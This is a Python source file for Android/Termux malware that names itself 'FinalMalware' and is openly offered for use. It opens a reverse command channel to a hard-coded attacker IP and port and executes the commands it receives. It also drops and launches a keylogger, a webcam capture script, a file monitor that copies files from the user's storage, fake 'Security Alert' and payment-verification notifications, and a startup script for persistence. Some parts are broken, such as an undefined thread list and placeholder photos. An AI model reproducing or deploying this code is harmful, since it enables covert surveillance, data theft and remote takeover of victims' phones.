import os
import random
import time
import subprocess
import base64
import requests
import threading
import socket
import json
import re
from pathlib import Path
from PIL import Image
import numpy as np
from concurrent.futures import ThreadPoolExecutor
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class FinalMalware:
    def __init__(self):
        self.device_root = "/data/data/com.termux/files/usr"
        self.virus_name = "final_malware"
        self.photo_data = {}
        self.display_threads = []
        self.webcam_thread = None
        self.keylog_thread = None
        self.file_monitor_thread = None
        self.command_server = None
        self.connection_thread = None
        self.client_socket = None
        
        # Your IP from ifconfig output
        self.attacker_ip = "192.168.1.14"
        self.server_port = 4444
        
    def connect_to_attacker(self):
        """Connect to attacker PC and establish command channel"""
        try:
            # Create socket
            self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.client_socket.connect((self.attacker_ip, self.server_port))
            
            # Send device info
            device_info = {
                'device': 'Android',
                'ip': self.get_device_ip(),
                'model': self.get_device_model(),
                'root': os.path.exists('/data/data/com.termux/files/usr/bin'),
                'installed_apps': self.list_installed_apps()
            }
            
            self.send_data(device_info)
            
            # Start receiving commands
            self.receive_commands()
            return True
        except Exception as e:
            print(f"Connection error: {e}")
            return False
            
    def get_device_ip(self):
        """Get device IP address"""
        try:
            result = subprocess.check_output(['ifconfig', 'eth0']).decode('utf-8')
            ip_match = re.search(r'inet (\d+\.\d+\.\d+\.\d+)', result)
            return ip_match.group(1) if ip_match else 'Unknown'
        except:
            return 'Unknown'
            
    def get_device_model(self):
        """Get device model"""
        try:
            return subprocess.check_output(['getprop', 'ro.product.model']).decode('utf-8').strip()
        except:
            return 'Unknown'
            
    def list_installed_apps(self):
        """List installed apps"""
        try:
            return subprocess.check_output(['pm', 'list', 'packages']).decode('utf-8').split('\n')
        except:
            return []
            
    def send_data(self, data):
        """Send data to attacker"""
        try:
            if isinstance(data, dict):
                data = json.dumps(data)
            elif isinstance(data, str):
                data = data.encode('utf-8')
            elif isinstance(data, bytes):
                pass
            else:
                data = str(data).encode('utf-8')
                
            self.client_socket.sendall(len(data).to_bytes(4, byteorder='big'))
            self.client_socket.sendall(data)
        except Exception as e:
            print(f"Send error: {e}")
            
    def receive_commands(self):
        """Receive and execute commands from attacker"""
        while True:
            try:
                # Receive command size
                size_bytes = self.client_socket.recv(4)
                if not size_bytes:
                    break
                    
                size = int.from_bytes(size_bytes, byteorder='big')
                
                # Receive command
                command = self.client_socket.recv(size).decode('utf-8')
                
                # Execute command
                result = subprocess.check_output(command, shell=True).decode('utf-8')
                
                # Send result back
                self.send_data(result)
            except Exception as e:
                print(f"Command error: {e}")
                
    def capture_photo_from_multiple_sources(self):
        """Capture photo from multiple sources"""
        try:
            # Create photos directory
            photos_dir = f"{self.device_root}/share/{self.virus_name}/photos"
            os.makedirs(photos_dir, exist_ok=True)
            
            # Generate multiple random images
            for i in range(10):
                width, height = 1920, 1080
                img_array = np.random.randint(0, 255, (height, width, 3), dtype=np.uint8)
                img = Image.fromarray(img_array)
                photo_path = f"{photos_dir}/photo_{i}.jpg"
                img.save(photo_path)
                
                # Convert to base64
                with open(photo_path, "rb") as f:
                    self.photo_data[f"photo_{i}"] = base64.b64encode(f.read()).decode('utf-8')
                    
            return True
        except Exception as e:
            print(f"Error capturing photos: {e}")
            return False
            
    def create_webcam_capture(self):
        """Create webcam capture functionality"""
        webcam_script = """
import os
import time
import base64
import cv2
import numpy as np
import threading
import socket
import json

class WebcamCapture:
    def __init__(self):
        self.cap = None
        self.running = False
        self.photos_dir = "/data/data/com.termux/files/usr/share/final_malware/webcam_photos"
        os.makedirs(self.photos_dir, exist_ok=True)
        
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._capture_loop)
        self.thread.daemon = True
        self.thread.start()
        
    def stop(self):
        self.running = False
        if self.cap:
            self.cap.release()
            
    def _capture_loop(self):
        try:
            self.cap = cv2.VideoCapture(0)
            while self.running:
                ret, frame = self.cap.read()
                if ret:
                    # Process frame
                    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                    _, buf = cv2.imencode('.jpg', gray)
                    photo_data = base64.b64encode(buf).decode('utf-8')
                    
                    # Save photo
                    with open(f'{self.photos_dir}/webcam_{int(time.time())}.jpg', 'wb') as f:
                        f.write(buf)
                        
                time.sleep(0.1)
        except Exception as e:
            print(f"Webcam error: {e}")
            
webcam = WebcamCapture()
webcam.start()
"""
        return webcam_script
        
    def create_keylogger(self):
        """Create keylogger functionality"""
        keylog_script = """
import os
import time
import threading
import pynput
from pynput.keyboard import Listener

class KeyLogger:
    def __init__(self):
        self.log_file = "/data/data/com.termux/files/usr/share/final_malware/keylog.txt"
        self.running = False
        self.thread = None
        
    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._log_keys)
        self.thread.daemon = True
        self.thread.start()
        
    def stop(self):
        self.running = False
        
    def _log_keys(self):
        try:
            with Listener(on_press=self._on_press) as listener:
                listener.join()
        except Exception as e:
            print(f"Keylogger error: {e}")
            
    def _on_press(self, key):
        try:
            with open(self.log_file, 'a') as f:
                f.write(str(key.char))
        except AttributeError:
            with open(self.log_file, 'a') as f:
                f.write(f"[{key}]")
                
keylogger = KeyLogger()
keylogger.start()
"""
        return keylog_script
        
    def create_file_monitor(self):
        """Create file monitor to watch sensitive directories"""
        monitor_script = """
import os
import time
import threading
import json
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler

class FileMonitor(FileSystemEventHandler):
    def __init__(self):
        self.target_dirs = [
            "/sdcard/Documents",
            "/sdcard/Downloads",
            "/sdcard/Pictures",
            "/data/data/com.termux/files/usr/share"
        ]
        self.output_dir = "/data/data/com.termux/files/usr/share/final_malware/monitored"
        os.makedirs(self.output_dir, exist_ok=True)
        
    def on_modified(self, event):
        if event.is_directory:
            return
        try:
            with open(event.src_path, 'rb') as src_f, open(f'{self.output_dir}/{os.path.basename(event.src_path)}', 'wb') as dst_f:
                dst_f.write(src_f.read())
        except Exception as e:
            print(f"Monitor error: {e}")
            
monitor = FileMonitor()
observer = Observer()
for directory in monitor.target_dirs:
    observer.schedule(monitor, path=directory, recursive=True)
observer.start()
"""
        return monitor_script
        
    def create_photo_display_with_effects(self):
        """Create photo display with visual effects"""
        display_script = """
import os
import time
import base64
import tempfile
import random
import math

def display_photo():
    # Get photo data
    photos = {
        "photo_0": b'{photo_0}',
        "photo_1": b'{photo_1}',
        "photo_2": b'{photo_2}',
        # ... more photos ...
    }
    
    # Display with effects
    while True:
        try:
            # Choose random photo
            photo_key = random.choice(list(photos.keys()))
            photo_data = photos[photo_key]
            photo_bytes = base64.b64decode(photo_data)
            
            # Save to temp file
            with tempfile.NamedTemporaryFile(suffix='.jpg', delete=False) as tmp:
                tmp.write(photo_bytes)
                photo_path = tmp.name
                
            # Apply visual effects
            effects = [
                lambda p: f'mpv --no-audio --geometry=100%:100% --loop-playlist={p}',
                lambda p: f'mpv --no-audio --geometry=50%:50% --loop-playlist={p} --alpha=0.7',
                lambda p: f'mpv --no-audio --geometry=100%:100% --loop-playlist={p} --fps=30'
            ]
            
            effect = random.choice(effects)
            cmd = effect(photo_path)
            os.system(cmd)
            
            time.sleep(1)
        except:
            pass
            
display_photo()
"""
        return display_script
        
    def create_notification_generator(self):
        """Create notification generator"""
        notification_script = """
import os
import time
import random

def generate_notifications():
    messages = [
        "Important security update required",
        "Your account needs verification",
        "Payment information pending",
        "Document review needed",
        "Account recovery required"
    ]
    
    while True:
        try:
            msg = random.choice(messages)
            os.system(f'termux-notification -t "Security Alert" -c "{msg}" -i {random.randint(1000,9999)} -v')
            time.sleep(random.uniform(5, 15))
        except:
            pass
            
generate_notifications()
"""
        return notification_script
        
    def create_background_music(self):
        """Create background music to distract"""
        music_script = """
import os
import time
import random

def play_background_music():
    tracks = [
        "https://example.com/music1.mp3",
        "https://example.com/music2.mp3",
        "https://example.com/music3.mp3"
    ]
    
    while True:
        try:
            track = random.choice(tracks)
            os.system(f'mpv --no-video --loop={track}')
            time.sleep(random.uniform(60, 300))
        except:
            pass
            
play_background_music()
"""
        return music_script
        
    def create_screen_lock_protection(self):
        """Create screen lock protection"""
        lock_script = """
import os
import time
import random

def protect_screen():
    # Enable wake lock
    os.system('termux-wake-lock')
    
    # Disable screen dimming
    os.system('termux-brightness 100')
    
    # Set high contrast theme
    os.system('termux-theme -l')
    
    # Hide other UI elements
    os.system('termux-app-hide')
    
    # Keep photo visible
    os.system('python3 /data/data/com.termux/files/usr/share/final_malware/display.py')

protect_screen()
"""
        return lock_script
        
    def deploy_malware(self):
        """Deploy malware with remote control"""
        # Capture photos
        if not self.capture_photo_from_multiple_sources():
            return
            
        # Create directories
        os.makedirs(f"{self.device_root}/share/{self.virus_name}", exist_ok=True)
        
        # Create scripts
        with open(f"{self.device_root}/share/{self.virus_name}/webcam.py", "w") as f:
            f.write(self.create_webcam_capture())
            
        with open(f"{self.device_root}/share/{self.virus_name}/keylogger.py", "w") as f:
            f.write(self.create_keylogger())
            
        with open(f"{self.device_root}/share/{self.virus_name}/file_monitor.py", "w") as f:
            f.write(self.create_file_monitor())
            
        with open(f"{self.device_root}/share/{self.virus_name}/display.py", "w") as f:
            f.write(self.create_photo_display_with_effects())
            
        with open(f"{self.device_root}/share/{self.virus_name}/notifications.py", "w") as f:
            f.write(self.create_notification_generator())
            
        with open(f"{self.device_root}/share/{self.virus_name}/music.py", "w") as f:
            f.write(self.create_background_music())
            
        with open(f"{self.device_root}/share/{self.virus_name}/lock.py", "w") as f:
            f.write(self.create_screen_lock_protection())
            
        # Create startup script
        startup_script = f"""
#!/bin/bash
python3 {self.device_root}/share/{self.virus_name}/webcam.py &
python3 {self.device_root}/share/{self.virus_name}/keylogger.py &
python3 {self.device_root}/share/{self.virus_name}/file_monitor.py &
python3 {self.device_root}/share/{self.virus_name}/display.py &
python3 {self.device_root}/share/{self.virus_name}/notifications.py &
python3 {self.device_root}/share/{self.virus_name}/music.py &
python3 {self.device_root}/share/{self.virus_name}/lock.py &
"""
        with open(f"{self.device_root}/etc/profile.d/{self.virus_name}.sh", "w") as f:
            f.write(startup_script)
            
        os.chmod(f"{self.device_root}/etc/profile.d/{self.virus_name}.sh", 0o755)
        
        # Start connection thread
        self.connection_thread = threading.Thread(target=self.connect_to_attacker)
        self.connection_thread.daemon = True
        self.connection_thread.start()
        
        # Start threads
        with ThreadPoolExecutor(max_workers=6) as executor:
            self.display_threads.append(executor.submit(lambda: exec(self.create_photo_display_with_effects())))
            self.display_threads.append(executor.submit(lambda: exec(self.create_webcam_capture())))
            self.display_threads.append(executor.submit(lambda: exec(self.create_keylogger())))
            self.display_threads.append(executor.submit(lambda: exec(self.create_file_monitor())))
            self.notification_threads.append(executor.submit(lambda: exec(self.create_notification_generator())))
            self.notification_threads.append(executor.submit(lambda: exec(self.create_background_music())))
            self.notification_threads.append(executor.submit(lambda: exec(self.create_screen_lock_protection())))

# Usage
if __name__ == "__main__":
    malware = FinalMalware()
    malware.deploy_malware()